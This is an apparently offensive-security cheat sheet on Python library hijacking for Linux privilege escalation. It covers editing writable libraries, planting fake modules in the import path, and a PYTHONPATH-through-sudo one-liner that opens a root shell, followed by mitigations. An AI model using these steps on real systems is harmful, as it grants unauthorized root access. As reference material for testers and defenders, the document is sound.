# Python Library Hijacking

## Check SUID/SGID script permissions
```bash
ls -l <script_name>.py
```

## Inspect script contents

```bash
cat <script_name>.py
```

## Locate imported library

```bash
grep -r "def <function_name>" /usr/local/lib/python3.*/dist-packages/<library_name>/
```

## Check library file permissions

```bash
ls -l /usr/local/lib/python3.*/dist-packages/<library_name>/__init__.py
```

## Inject malicious code (if writable)

```bash
nano /usr/local/lib/python3.*/dist-packages/<library_name>/__init__.py
```

## Execute the script (sudo if required)

```bash
sudo python3 <script_name>.py
```

---

# Key Concepts

* **Python module loading**
  Python imports modules based on the order in `sys.path`.

* **Hijacking vector**
  If the attacker can write to a library file or place a fake library earlier in the import path, the malicious code will run.

* **SUID/SGID Python scripts**
  Dangerous because imported modules execute with elevated privileges.

---

# Attack Scenarios

### 1. Writable Python library (direct modification)

1. Identify SUID/SGID Python script.
2. Check imported modules.
3. Modify writable library file.
4. Run script to execute malicious code as root.

### 2. Library path manipulation

1. Check Python import paths:

   ```bash
   python3 -c "import sys; print(sys.path)"
   ```
2. Find a writable directory earlier in the search order.
3. Drop a malicious module in that directory:

   ```bash
   echo 'import os; os.system("id")' > <library_name>.py
   ```
4. Run the script.

### 3. Hijacking via PYTHONPATH

If sudo allows environment variables:

```bash
sudo -l
```

Then:

```bash
mkdir /tmp/hijack
echo 'import os; os.system("/bin/bash")' > /tmp/hijack/<library_name>.py
PYTHONPATH=/tmp/hijack sudo python3 <script_name>.py
```

---

# Mitigation

* Correct library permissions
  Remove world/group write access.
* Avoid SUID Python scripts
  Python is not safe for SUID usage.
* Do not allow `PYTHONPATH` or other env vars via sudo.
* Use virtual environments
  Prevents accidental system-wide library hijacking.
* Install packages only from trusted sources.
